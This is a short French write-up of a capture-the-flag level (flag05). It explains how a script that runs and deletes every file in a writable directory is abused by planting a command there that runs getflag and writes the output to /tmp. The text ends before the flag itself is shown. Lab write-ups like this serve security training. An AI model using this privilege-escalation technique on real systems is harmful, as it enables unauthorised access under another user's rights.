@@ -1,0 +1,15 @@
+On fait un "find / -user flag05" et on remarque 2 fichier, un que l'on ne peut pas ouvrir, et un que l'on peut lire.
+
+/user/sbin/openarenaserver contient:
+#!/bin/sh
+for i in /opt/openarenaserver/* ; do
+  (ulimit -t 5; bash -x "$i")
+  rm -f "$i"
+done
+
+En lisant ce code on apprend que tout les fichiers contenu dans /opt/openarenaserver/ sont executé puis supprimé.
+On a les droit sur ce dossier.
+Il suffit donc de créer un fichier éxecutant getflag et de rediriger le resultat dans un fichier:
+echo "getflag > /tmp/mdp" > /opt/openarenaserver/crack
+
+Après quelques secondes, le fichier /tmp/mdp est créé et contient le flag suivant: 
